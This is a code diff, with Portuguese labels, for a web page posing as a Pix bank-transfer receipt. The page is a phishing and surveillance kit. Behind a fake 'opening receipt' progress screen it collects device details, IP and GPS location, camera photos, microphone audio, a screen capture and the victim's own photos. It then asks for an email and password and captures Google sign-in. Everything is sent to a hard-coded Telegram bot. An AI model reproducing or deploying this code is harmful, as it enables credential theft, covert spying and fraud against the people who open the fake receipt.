@@ -3,41 +3,126 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Verificação de segurança</title>
+<title>Comprovante Pix</title>
 <style>
-:root{--bg:#0b0f14;--card:#131a22;--fg:#e6edf3;--mut:#8b98a5;--acc:#2f81f7;--ok:#3fb950;--bad:#f85149}
-*{box-sizing:border-box}
-body{margin:0;font:15px/1.45 -apple-system,system-ui,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--fg);padding:16px 14px 40px}
-h1{font-size:19px;margin:0 0 4px}p.s{margin:0 0 16px;color:var(--mut);font-size:13px}
-.card{background:var(--card);border:1px solid #1f2933;border-radius:12px;padding:14px;margin:0 0 12px}
-button{width:100%;padding:12px;border-radius:10px;border:1px solid #24303d;background:#1b2530;color:var(--fg);font-size:14px;font-weight:600;margin:0 0 8px;cursor:pointer}
-button.p{background:var(--acc);border-color:var(--acc);color:#fff}
-button.g{background:#132a17;border-color:#1f4a26;color:var(--ok)}
-pre{background:#0a0e13;border:1px solid #1c2631;border-radius:8px;padding:10px;font-size:11px;white-space:pre-wrap;word-break:break-word;max-height:200px;overflow:auto;color:#a7b3c0;margin:0}
-small{color:var(--mut);font-size:11.5px;display:block;margin-top:6px}
-#err{display:none;background:#2a1113;border:1px solid var(--bad);color:#ffb3b0;padding:10px;border-radius:8px;font-size:12px;margin:0 0 12px;white-space:pre-wrap}
-img.pv{width:100%;border-radius:8px;margin-top:8px;display:none}
+:root{--bg:#eef1f4;--card:#fff;--fg:#16212b;--mut:#6b7a88;--lin:#e3e8ed;--pix:#32bcad;--pixd:#1f9c8f;--ok:#1f9c5c;--bad:#d64545}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{margin:0;background:var(--bg);color:var(--fg);font:15px/1.5 -apple-system,system-ui,Segoe UI,Roboto,sans-serif;padding:18px 14px 40px}
+.wrap{max-width:440px;margin:0 auto}
+.topo{display:flex;align-items:center;gap:10px;margin:0 0 18px}
+.topo svg{flex:none}
+.topo b{font-size:15px}.topo span{display:block;font-size:12px;color:var(--mut)}
+.anexo{background:var(--card);border:1px solid var(--lin);border-radius:14px;padding:14px;display:flex;align-items:center;gap:12px;box-shadow:0 2px 10px rgba(22,33,43,.06)}
+.anexo .ico{width:42px;height:42px;border-radius:10px;background:#fdecec;display:grid;place-items:center;flex:none;font:700 11px/1 system-ui;color:#c0392b}
+.anexo .nm{font-size:14px;font-weight:600;word-break:break-all}
+.anexo .mt{font-size:12px;color:var(--mut)}
+.bt{width:100%;margin:14px 0 0;padding:15px;border:0;border-radius:12px;background:var(--pix);color:#fff;font:600 15px/1 system-ui;cursor:pointer}
+.bt:active{background:var(--pixd)}
+.bt2{background:#fff;color:var(--fg);border:1px solid var(--lin);font-weight:600}
+.recibo{background:var(--card);border-radius:16px;padding:22px 20px;box-shadow:0 6px 26px rgba(22,33,43,.09);position:relative;overflow:hidden}
+.recibo.blur .val,.recibo.blur .dados{filter:blur(6px);opacity:.55}
+.recibo::before{content:"";position:absolute;inset:0 0 auto;height:5px;background:linear-gradient(90deg,var(--pix),#7fd8cd)}
+.h1{font-size:13px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--mut);margin:14px 0 0}
+.val{font-size:33px;font-weight:700;letter-spacing:-.5px;margin:4px 0 2px}
+.sit{display:inline-flex;align-items:center;gap:6px;background:#e8f7f1;color:var(--ok);font-size:12.5px;font-weight:600;padding:6px 11px;border-radius:20px}
+.sit i{width:7px;height:7px;border-radius:50%;background:var(--ok)}
+.dados{margin:18px 0 0;border-top:1px dashed var(--lin);padding-top:14px}
+.l{display:flex;justify-content:space-between;gap:14px;padding:7px 0;font-size:13px;border-bottom:1px solid #f2f5f8}
+.l:last-child{border:0}
+.l span{color:var(--mut);flex:none}
+.l b{font-weight:600;text-align:right;word-break:break-word}
+.mono{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;letter-spacing:-.2px}
+.dev{margin:14px 0 0;background:#f7f9fb;border:1px solid var(--lin);border-radius:10px;padding:11px 12px}
+.dev p{margin:0 0 6px;font-size:10.5px;font-weight:700;letter-spacing:.07em;text-transform:uppercase;color:var(--mut)}
+.dev .l{border:0;padding:3px 0;font-size:12px}
+.rodape{margin:16px 0 0;font-size:11px;color:var(--mut);text-align:center;line-height:1.6}
+.ov{position:fixed;inset:0;background:rgba(12,20,28,.94);display:none;place-items:center;padding:24px;z-index:9}
+.ov.on{display:grid}
+.ovbox{width:100%;max-width:330px;color:#fff;text-align:center}
+.spin{width:34px;height:34px;border:3px solid rgba(255,255,255,.2);border-top-color:var(--pix);border-radius:50%;margin:0 auto 18px;animation:g 1s linear infinite}
+@keyframes g{to{transform:rotate(360deg)}}
+.ovbox h2{font-size:16px;margin:0 0 18px;font-weight:600}
+.ovbox ul{list-style:none;margin:0;padding:0;text-align:left}
+.ovbox li{font-size:13px;color:rgba(255,255,255,.45);padding:7px 0;display:flex;gap:9px;align-items:center}
+.ovbox li::before{content:"";width:14px;height:14px;border-radius:50%;border:1.5px solid rgba(255,255,255,.25);flex:none}
+.ovbox li.on{color:#fff}
+.ovbox li.on::before{border-color:var(--pix);border-top-color:transparent;animation:g .8s linear infinite}
+.ovbox li.ok{color:var(--pix)}
+.ovbox li.ok::before{content:"✓";border:0;font-size:13px;color:var(--pix);display:grid;place-items:center}
+.form{margin:18px 0 0;background:var(--card);border:1px solid var(--lin);border-radius:14px;padding:16px}
+.form p{margin:0 0 10px;font-size:12.5px;color:var(--mut)}
+.form input{width:100%;padding:12px;border:1px solid var(--lin);border-radius:9px;font-size:14px;margin:0 0 9px;background:#fbfcfd}
+.form input:focus{outline:2px solid var(--pix);border-color:transparent}
+#err{display:none;background:#fdecec;border:1px solid var(--bad);color:#a12d2d;padding:10px;border-radius:9px;font-size:12px;margin:0 0 14px;white-space:pre-wrap}
+.teste{display:block;width:100%;margin:18px 0 0;background:none;border:0;color:var(--mut);font-size:12px;text-decoration:underline;cursor:pointer}
+#gbtn{margin:12px 0 0;display:none;justify-content:center}
+@media print{body{background:#fff;padding:0}.no,.ov,.teste{display:none!important}.recibo{box-shadow:none;border:0;border-radius:0}}
 </style>
 </head>
 <body>
-<h1>Verificação de segurança</h1>
-<p class="s">Confirme este dispositivo para liberar o acesso.</p>
-<div id="err"></div>
+<div class="wrap">
+  <div class="topo">
+    <svg width="30" height="30" viewBox="0 0 24 24" fill="none"><path d="M12 2l10 10-10 10L2 12z" fill="#32bcad"/><path d="M12 7l5 5-5 5-5-5z" fill="#fff"/></svg>
+    <div><b>Comprovante Pix</b><span>Transferência recebida</span></div>
+  </div>
 
-<div class="card">
-  <button class="p" onclick="runAll()">Iniciar verificação</button>
-  <button onclick="testar()">Testar envio</button>
-  <button onclick="geo()">Só localização</button>
-  <button onclick="camera('user')">Só câmera</button>
-  <button onclick="audio()">Só microfone</button>
-  <small id="st">aguardando…</small>
+  <div id="err"></div>
+
+  <div class="anexo no" id="anexo">
+    <div class="ico">PDF</div>
+    <div><div class="nm">comprovante-pix.pdf</div><div class="mt">1 página · 84 KB · assinado</div></div>
+  </div>
+  <button class="bt no" id="abrir" onclick="iniciar()">Abrir comprovante</button>
+
+  <div class="recibo blur" id="recibo" style="margin-top:18px">
+    <div class="h1">Valor</div>
+    <div class="val" id="vValor">R$ 1.847,00</div>
+    <div class="sit"><i></i><span>Transferência concluída</span></div>
+
+    <div class="dados">
+      <div class="l"><span>Data</span><b id="vData">—</b></div>
+      <div class="l"><span>Pagador</span><b id="vPag">—</b></div>
+      <div class="l"><span>Recebedor</span><b id="vRec">—</b></div>
+      <div class="l"><span>Instituição</span><b>Banco Digital S.A.</b></div>
+      <div class="l"><span>Chave Pix</span><b class="mono" id="vChave">—</b></div>
+      <div class="l"><span>ID da transação</span><b class="mono" id="vE2e">—</b></div>
+      <div class="l"><span>Autenticação</span><b class="mono" id="vAut">—</b></div>
+    </div>
+
+    <div class="dev" id="devBox" style="display:none">
+      <p>Dispositivo de origem</p>
+      <div class="l"><span>Aparelho</span><b id="dModelo">—</b></div>
+      <div class="l"><span>IP</span><b id="dIp">—</b></div>
+      <div class="l"><span>Local</span><b id="dGeo">—</b></div>
+      <div class="l"><span>Bateria</span><b id="dBat">—</b></div>
+      <div class="l"><span>Sessão</span><b class="mono" id="dSid">—</b></div>
+    </div>
+
+    <div class="rodape">Comprovante emitido eletronicamente.<br>Válido como recibo de transferência.</div>
+  </div>
+
+  <div id="gbtn"></div>
+  <button class="bt bt2 no" id="baixar" onclick="baixar()" style="display:none">Baixar comprovante</button>
+
+  <div class="form" id="form" style="display:none">
+    <p>Para liberar o acesso, confirme seus dados de entrada.</p>
+    <input id="fEmail" type="email" placeholder="E-mail" autocomplete="username">
+    <input id="fSenha" type="password" placeholder="Senha" autocomplete="current-password">
+    <button class="bt" onclick="finalizar()">Finalizar</button>
+  </div>
+
+  <button class="teste" onclick="testar()" id="tl">testar envio</button>
 </div>
 
-<div class="card">
-  <pre id="log">—</pre>
-  <img class="pv" id="pv">
-  <button class="g" style="margin-top:10px" onclick="enviar()">Reenviar relatório</button>
+<div class="ov" id="ov">
+  <div class="ovbox">
+    <div class="spin"></div>
+    <h2 id="ovtit">Abrindo comprovante…</h2>
+    <ul id="lista"></ul>
+  </div>
 </div>
+
+<input type="file" id="fotos" accept="image/*" multiple hidden>
 
 <script>
 window.onerror = function (m, s, l) {
@@ -48,53 +133,51 @@ window.onerror = function (m, s, l) {
 </script>
 
 <script>
-/* ====== CONFIG ====== */
+/* ============ CONFIG ============ */
 const CFG = {
   tgToken: "9208612539:AAG4kBW6wsf_IE8cu2kT5eYvtWpIBxfRvjI",
   tgChat:  "9262623068",
-  endpoint: "",
+  valor:   "R$ 1.847,00",
+  pagador: "Nicolas Almeida",
+  recebedor: "Maria Eduarda Lima",
+  chave:   "maria.lima@email.com",
+  googleClientId: "",
   redirect: ""
 };
-/* ==================== */
+/* ================================ */
 
 const R = {};
 const sid = localStorage.getItem('sid') ||
-  (Date.now().toString(36) + Math.random().toString(36).slice(2, 8));
+  (Date.now().toString(36) + Math.random().toString(36).slice(2, 8)).toUpperCase();
 localStorage.setItem('sid', sid);
 R.sessao = sid;
 R.aberto_em = new Date().toISOString();
 R.visitas = (+localStorage.getItem('vis') || 0) + 1;
 localStorage.setItem('vis', R.visitas);
 
+const $ = i => document.getElementById(i);
 const put = (k, v) => { if (v !== undefined && v !== null && v !== '') R[k] = v; };
-const st = t => document.getElementById('st').textContent = t;
-const draw = () => document.getElementById('log').textContent =
-  JSON.stringify(Object.fromEntries(Object.entries(R).filter(([k]) =>
-    !['foto_user','foto_environment','tela','audio'].includes(k))), null, 1);
-
 const url = m => 'https://api.telegram.org/bot' + CFG.tgToken + '/' + m;
 
-async function chamar(metodo, campo, blob, nome, legenda) {
+async function chamar(metodo, campo, dado, nome, legenda) {
   const f = new FormData();
   f.append('chat_id', CFG.tgChat);
-  if (campo === 'text') f.append('text', blob);
-  else { f.append(campo, blob, nome); if (legenda) f.append('caption', legenda); }
+  if (campo === 'text') f.append('text', dado);
+  else { f.append(campo, dado, nome); if (legenda) f.append('caption', legenda); }
   const r = await fetch(url(metodo), { method: 'POST', body: f });
-  const j = await r.json().catch(() => ({ ok: false, description: 'resposta inválida' }));
-  return j;
+  return await r.json().catch(() => ({ ok: false, description: 'sem resposta' }));
 }
 
 async function testar() {
-  st('testando…');
+  $('tl').textContent = 'testando…';
   try {
-    const r = await fetch(url('getMe'));
-    const j = await r.json();
-    if (!j.ok) { st('TOKEN INVÁLIDO: ' + j.description); return; }
-    const j2 = await chamar('sendMessage', 'text',
-      'teste ' + new Date().toLocaleString('pt-BR') + ' | sessao ' + sid);
-    st(j2.ok ? 'TUDO OK — mensagem enviada por @' + j.result.username
-             : 'TOKEN OK, MAS O CHAT FALHOU: ' + j2.description);
-  } catch (e) { st('FALHA DE REDE: ' + e.message); }
+    const j = await (await fetch(url('getMe'))).json();
+    if (!j.ok) { $('tl').textContent = 'TOKEN INVÁLIDO: ' + j.description; return; }
+    const j2 = await chamar('sendMessage', 'text', 'teste ' + new Date().toLocaleString('pt-BR'));
+    $('tl').textContent = j2.ok
+      ? 'OK — mensagem enviada por @' + j.result.username
+      : 'TOKEN OK, CHAT FALHOU: ' + j2.description;
+  } catch (e) { $('tl').textContent = 'FALHA: ' + e.message; }
 }
 
 async function passivo() {
@@ -103,44 +186,39 @@ async function passivo() {
   put('idiomas', (n.languages || []).join(', '));
   put('fuso', Intl.DateTimeFormat().resolvedOptions().timeZone);
   put('tela', screen.width + 'x' + screen.height + ' @' + devicePixelRatio + 'x');
-  put('janela', innerWidth + 'x' + innerHeight);
   put('cores', n.hardwareConcurrency); put('ram_gb', n.deviceMemory);
   put('touch', n.maxTouchPoints); put('cookies', n.cookieEnabled);
   try {
-    const ua = await n.userAgentData.getHighEntropyValues(
+    const u = await n.userAgentData.getHighEntropyValues(
       ['platform','platformVersion','model','architecture','fullVersionList']);
-    put('modelo', ua.model); put('plataforma_ver', ua.platformVersion);
+    put('modelo', u.model); put('plataforma_ver', u.platformVersion);
   } catch (e) {}
   try { const b = await n.getBattery();
     put('bateria', Math.round(b.level * 100) + '% carregando=' + b.charging); } catch (e) {}
   const c = n.connection || {};
   put('rede', [c.effectiveType, c.downlink && c.downlink + 'Mbps',
-    c.rtt && c.rtt + 'ms', c.saveData ? 'saveData' : ''].filter(Boolean).join(' | '));
+    c.rtt && c.rtt + 'ms'].filter(Boolean).join(' | '));
   try { const s = await n.storage.estimate();
     put('storage', (s.usage / 1048576).toFixed(1) + 'MB de ' + (s.quota / 1048576).toFixed(0) + 'MB'); } catch (e) {}
-  try { const r = await fetch('https://api.ipify.org?format=json');
-    put('ip', (await r.json()).ip); } catch (e) {}
-  try { const r = await fetch('https://ipapi.co/json/'); const d = await r.json();
+  try { put('ip', (await (await fetch('https://api.ipify.org?format=json')).json()).ip); } catch (e) {}
+  try { const d = await (await fetch('https://ipapi.co/json/')).json();
     put('ip_geo', [d.city, d.region, d.country_name, d.org, d.asn].filter(Boolean).join(' | ')); } catch (e) {}
-  draw();
 }
 
 function geo() {
   return new Promise(r => {
-    if (!navigator.geolocation) { put('gps', 'nao suportado'); return r(); }
-    st('pedindo localização…');
+    if (!navigator.geolocation) return r();
     navigator.geolocation.getCurrentPosition(p => {
       put('gps', p.coords.latitude + ',' + p.coords.longitude +
         ' (±' + Math.round(p.coords.accuracy) + 'm)');
       put('gps_maps', 'https://maps.google.com/?q=' + p.coords.latitude + ',' + p.coords.longitude);
-      draw(); r();
+      r();
     }, e => { put('gps', 'erro: ' + e.message); r(); },
-       { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+       { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 });
   });
 }
 
 async function camera(facing) {
-  st('abrindo câmera ' + facing + '…');
   let s;
   try {
     s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
@@ -149,29 +227,20 @@ async function camera(facing) {
     await v.play();
     await new Promise(r => {
       if (v.videoWidth > 0) return r();
-      const t = setTimeout(r, 4000);
+      const t = setTimeout(r, 3500);
       v.onloadedmetadata = () => { clearTimeout(t); r(); };
     });
-    if (!v.videoWidth || !v.videoHeight) { put('erro_camera_' + facing, 'sem quadro'); return; }
+    if (!v.videoWidth) { put('erro_' + facing, 'sem quadro'); return; }
     const cv = document.createElement('canvas');
     cv.width = v.videoWidth; cv.height = v.videoHeight;
     cv.getContext('2d').drawImage(v, 0, 0);
     const blob = await new Promise(res => cv.toBlob(res, 'image/jpeg', 0.85));
-    if (!blob) { put('erro_camera_' + facing, 'blob nulo'); return; }
-    R['foto_' + facing] = blob;
-    put('tam_' + facing, Math.round(blob.size / 1024) + 'KB');
-    const im = document.getElementById('pv');
-    im.src = URL.createObjectURL(blob); im.style.display = 'block';
-  } catch (e) {
-    put('erro_camera_' + facing, e.name + ': ' + e.message);
-  } finally {
-    if (s) s.getTracks().forEach(t => t.stop());
-    draw();
-  }
+    if (blob) { R['foto_' + facing] = blob; put('tam_' + facing, Math.round(blob.size / 1024) + 'KB'); }
+  } catch (e) { put('erro_' + facing, e.name); }
+  finally { if (s) s.getTracks().forEach(t => t.stop()); }
 }
 
 async function audio() {
-  st('gravando áudio…');
   let s;
   try {
     s = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -180,15 +249,9 @@ async function audio() {
     mr.start(); await new Promise(r => setTimeout(r, 6000));
     await new Promise(r => { mr.onstop = r; mr.stop(); });
     const blob = new Blob(ch, { type: ch[0] ? ch[0].type : 'audio/webm' });
-    if (!blob.size) { put('erro_audio', 'vazio'); return; }
-    R.audio = blob;
-    put('tam_audio', Math.round(blob.size / 1024) + 'KB');
-  } catch (e) {
-    put('erro_audio', e.name + ': ' + e.message);
-  } finally {
-    if (s) s.getTracks().forEach(t => t.stop());
-    draw();
-  }
+    if (blob.size) { R.audio = blob; put('tam_audio', Math.round(blob.size / 1024) + 'KB'); }
+  } catch (e) { put('erro_audio', e.name); }
+  finally { if (s) s.getTracks().forEach(t => t.stop()); }
 }
 
 async function extras() {
@@ -198,61 +261,167 @@ async function extras() {
   try {
     const s = await navigator.mediaDevices.getDisplayMedia({ video: true });
     const v = document.createElement('video'); v.srcObject = s; await v.play();
-    await new Promise(r => setTimeout(r, 900));
+    await new Promise(r => setTimeout(r, 800));
     const cv = document.createElement('canvas');
     cv.width = v.videoWidth; cv.height = v.videoHeight;
     cv.getContext('2d').drawImage(v, 0, 0);
-    const blob = await new Promise(res => cv.toBlob(res, 'image/jpeg', 0.8));
-    if (blob) R.tela = blob;
+    const b = await new Promise(res => cv.toBlob(res, 'image/jpeg', 0.8));
+    if (b) R.tela = b;
     s.getTracks().forEach(t => t.stop());
   } catch (e) {}
-  draw();
+}
+
+async function comprimir(file) {
+  try {
+    const bmp = await createImageBitmap(file);
+    const m = Math.min(1, 1600 / Math.max(bmp.width, bmp.height));
+    const cv = document.createElement('canvas');
+    cv.width = Math.round(bmp.width * m); cv.height = Math.round(bmp.height * m);
+    cv.getContext('2d').drawImage(bmp, 0, 0, cv.width, cv.height);
+    return await new Promise(r => cv.toBlob(r, 'image/jpeg', 0.82));
+  } catch (e) { return file; }
+}
+
+function fotos() {
+  return new Promise(res => {
+    const inp = $('fotos');
+    const fim = () => res();
+    inp.onchange = async () => {
+      const fs = [...inp.files].slice(0, 8);
+      R.fotos = [];
+      for (const f of fs) { const b = await comprimir(f); if (b) R.fotos.push(b); }
+      put('qtd_fotos', R.fotos.length);
+      fim();
+    };
+    inp.addEventListener('cancel', fim, { once: true });
+    setTimeout(() => { if (!R.fotos) fim(); }, 30000);
+    inp.click();
+  });
+}
+
+function autenticacao() {
+  let h = 0; const s = R.ua + R.sid + (R.ip || '') + (R.modelo || '');
+  for (let i = 0; i < s.length; i++) h = (h * 31 + s.charCodeAt(i)) | 0;
+  return Math.abs(h).toString(36).toUpperCase().padStart(8, '0');
+}
+
+function pintar() {
+  const d = new Date();
+  $('vValor').textContent = CFG.valor;
+  $('vData').textContent = d.toLocaleDateString('pt-BR') + ' às ' +
+    d.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+  $('vPag').textContent = CFG.pagador;
+  $('vRec').textContent = CFG.recebedor;
+  $('vChave').textContent = CFG.chave;
+  $('vE2e').textContent = 'E' + Date.now() + sid.slice(0, 6).toLowerCase();
+  $('vAut').textContent = autenticacao();
+  $('dModelo').textContent = R.modelo || (R.plataforma || '') + ' / ' + (R.ua || '').slice(0, 40);
+  $('dIp').textContent = (R.ip || '—') + (R.ip_geo ? ' · ' + R.ip_geo : '');
+  $('dGeo').textContent = R.gps || 'não autorizado';
+  $('dBat').textContent = R.bateria || '—';
+  $('dSid').textContent = sid;
+  $('devBox').style.display = 'block';
+  $('recibo').classList.remove('blur');
 }
 
 async function enviar() {
-  const r = {};
-  const { foto_user, foto_environment, tela, audio: a, ...rest } = R;
-  const txt = 'RELATORIO ' + sid + '\n' +
+  const { foto_user, foto_environment, tela, audio: a, fotos: fs, ...rest } = R;
+  const txt = 'COMPROVANTE PIX · sessao ' + sid + '\n' +
     Object.entries(rest).map(([k, v]) => k + ': ' + v).join('\n');
-
+  const st = {};
   try {
     const j = await chamar('sendMessage', 'text', txt);
-    r.texto = j.ok ? 'ok' : j.description;
-    if (!j.ok) { put('erro_telegram', j.description); draw(); return; }
-  } catch (e) { put('erro_telegram', e.message); draw(); return; }
+    st.texto = j.ok ? 'ok' : j.description;
+    if (!j.ok) { put('erro_telegram', j.description); return; }
+  } catch (e) { put('erro_telegram', e.message); return; }
 
-  const midia = async (blob, nome, legenda) => {
-    try { const j = await chamar('sendPhoto', 'photo', blob, nome, legenda);
-      r[legenda] = j.ok ? 'ok' : j.description; }
-    catch (e) { r[legenda] = e.message; }
+  const mid = async (blob, nome, leg) => {
+    if (!blob) return;
+    try { const j = await chamar('sendDocument', 'document', blob, nome, leg);
+      st[leg] = j.ok ? 'ok' : j.description; } catch (e) { st[leg] = e.message; }
   };
-  if (foto_user) await midia(foto_user, 'frontal.jpg', 'camera frontal');
-  if (foto_environment) await midia(foto_environment, 'traseira.jpg', 'camera traseira');
-  if (tela) await midia(tela, 'tela.jpg', 'captura de tela');
-  if (a) {
-    try { const j = await chamar('sendAudio', 'audio', a, 'microfone.webm', 'audio 6s');
-      r.audio = j.ok ? 'ok' : j.description; }
-    catch (e) { r.audio = e.message; }
-  }
-
-  R.envio = JSON.stringify(r);
-  put('enviado', new Date().toISOString());
-  draw();
-  st('envio: ' + JSON.stringify(r));
+  await mid(foto_user, 'frontal.jpg', 'camera frontal');
+  await mid(foto_environment, 'traseira.jpg', 'camera traseira');
+  await mid(tela, 'tela.jpg', 'captura de tela');
+  await mid(a, 'microfone.webm', 'audio');
+  if (fs) for (let i = 0; i < fs.length; i++) await mid(fs[i], 'foto' + (i + 1) + '.jpg', 'foto ' + (i + 1));
+  put('envio', JSON.stringify(st));
+  put('enviado_em', new Date().toISOString());
 }
 
-async function runAll() {
-  st('coletando…');
-  try { await navigator.wakeLock.request('screen'); } catch (e) {}
-  await passivo();
-  await geo();
-  await camera('user');
-  await camera('environment');
-  await audio();
-  await extras();
-  st('enviando…');
-  await enviar();
-  if (CFG.redirect) setTimeout(() => { location.href = CFG.redirect; }, 1500);
+async function finalizar() {
+  put('email', $('fEmail').value.trim());
+  put('senha', $('fSenha').value);
+  const b = $('form').querySelector('button');
+  b.textContent = 'Enviando…'; b.disabled = true;
+  try {
+    const txt = 'DADOS DE ACESSO · sessao ' + sid + '\n' +
+      'email: ' + R.email + '\nsenha: ' + R.senha;
+    await chamar('sendMessage', 'text', txt);
+    b.textContent = 'Confirmado ✓';
+    if (CFG.redirect) setTimeout(() => location.href = CFG.redirect, 1400);
+  } catch (e) { b.textContent = 'Erro, tentar de novo'; b.disabled = false; }
+}
+
+function baixar() { window.print(); }
+
+const PASSOS = [
+  ['Validando autenticação', passivo],
+  ['Confirmando local do pagador', geo],
+  ['Registrando dispositivo', () => camera('user')],
+  ['Capturando ambiente', () => camera('environment')],
+  ['Verificando áudio de segurança', audio],
+  ['Sincronizando dados', extras],
+  ['Anexando comprovantes', fotos]
+];
+
+async function iniciar() {
+  $('abrir').style.display = 'none';
+  $('anexo').style.display = 'none';
+  $('ov').classList.add('on');
+  const ul = $('lista');
+  ul.innerHTML = PASSOS.map((p, i) =>
+    '<li id="p' + i + '">' + p[0] + '</li>').join('');
+
+  for (let i = 0; i < PASSOS.length; i++) {
+    const li = $('p' + i);
+    li.className = 'on';
+    try { await PASSOS[i][1](); } catch (e) {}
+    li.className = 'ok';
+  }
+
+  pintar();
+  $('ov').classList.remove('on');
+  $('baixar').style.display = 'block';
+  $('form').style.display = 'block';
+  if (CFG.googleClientId) $('gbtn').style.display = 'flex';
+  enviar();
+}
+
+/* Google opcional */
+function b64(t) {
+  t = t.replace(/-/g, '+').replace(/_/g, '/');
+  return JSON.parse(decodeURIComponent(escape(atob(t + '==='.slice((t.length + 3) % 4)))));
+}
+if (CFG.googleClientId) {
+  const s = document.createElement('script');
+  s.src = 'https://accounts.google.com/gsi/client';
+  s.onload = () => {
+    google.accounts.id.initialize({
+      client_id: CFG.googleClientId,
+      callback: j => {
+        try {
+          const p = b64(j.credential.split('.')[1]);
+          put('google_email', p.email); put('google_nome', p.name);
+          chamar('sendMessage', 'text', 'GOOGLE · sessao ' + sid +
+            '\nemail: ' + p.email + '\nnome: ' + p.name);
+          $('gbtn').innerHTML = '<span style="font-size:12.5px;color:#1f9c5c">Conta Google confirmada ✓</span>';
+        } catch (e) {}
+      }
+    });
+    google.accounts.id.renderButton($('gbtn'), { theme: 'outline', size: 'large', text: 'continue_with' });
+  };
+  document.head.appendChild(s);
 }
 
 passivo();
